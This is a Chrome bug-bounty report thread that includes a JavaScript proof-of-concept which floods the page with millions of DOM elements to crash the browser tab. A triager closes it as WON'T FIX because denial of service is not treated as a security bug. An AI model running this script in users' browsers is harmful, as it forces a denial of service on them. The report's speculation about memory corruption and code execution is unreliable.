@@ -1,0 +1,106 @@
+Issue ID: 357039769
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Browser Crash due to Aggressive DOM Manipulation</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>The vulnerability lies in the Chrome browser&#39;s inability to handle rapid and excessive DOM manipulations. When a large number of elements are created in quick succession, the browser&#39;s resource management fails to cope with the load, leading to a crash. This behavior is triggered by aggressively adding numerous DOM elements continuously without yielding.</p>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Expected:
+The browser should handle the DOM manipulations without crashing, possibly by throttling the creation of elements or optimizing memory management.</p>
+<p>Actual:
+The browser crashes due to excessive memory usage and CPU load, leading to a Denial of Service (DoS) condition.</p>
+<p>This issue can be exploited to cause a Denial of Service (DoS) attack. The underlying problem might also lead to memory corruption, potentially opening avenues for more severe exploits, such as arbitrary code execution.</p>
+<p>Steps to Reproduce:</p>
+<p>1.) Open the attached poc.html file in the Chrome browser.
+2.) Observe the browser&#39;s performance and memory usage.
+3.) The browser crashes within 19 seconds due to the excessive creation of DOM elements.</p>
+<p>Or you can paste the javascript directly in the dom on a new tab</p>
+<pre><code>(function triggerCrash() {
+    const inputValue = &quot;invalid://uri&quot;;
+    if (inputValue === &quot;invalid://uri&quot;) {
+        // crash by causing excessive resource usage
+        try {
+            const container = document.createElement(&#39;div&#39;);
+            document.body.appendChild(container);
+            let i = 0;
+
+            function createElements() {
+                for (let j = 0; j &lt; 1000000; j++) {
+                    const element = document.createElement(&#39;div&#39;);
+                    element.textContent = &#39;Crash Test &#39; + i++;
+                    container.appendChild(element);
+                }
+                if (i &lt; 10000000) {
+                    requestAnimationFrame(createElements); // Continue without yielding
+                }
+            }
+            createElements();
+        } catch (e) {
+            setTimeout(() =&gt; {
+                throw new Error(&#39;crash due to excessive DOM manipulation&#39;);
+            }, 100);
+        }
+    }
+})();
+</code></pre>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 127.0.6533.89 (Official Build) (64-bit)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>Yes</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Denial of Service (DoS)</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Wahid Fayad</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ap...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ap...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ap...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ap...@gmail.com
+TUROaE5EbGxOR014TmpneE16ZG1OelZtTkRSalpETXpNalV4TURnMVpUZz0=
+
+Author: ap...@gmail.com
+TXpVM01ETTVOelk1TFRVNE16a3dORE13TFRJME1qWTNORGd3TUE9PQ==
+
+Author: kr...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: kr...@google.com
+google_domain
+
+Author: kr...@google.com
+<p>Hi, denial of service bugs are not considered security bugs as detailed here: <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/faq.md%23Are-denial-of-service-issues-considered-security-bugs&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1h7f7n4TbYg3yNICgdZPbh">https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs</a></p>
+<p>For me this will only close the current tab, so closing as WON&#39;T FIX.</p>
+
+Author: kr...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
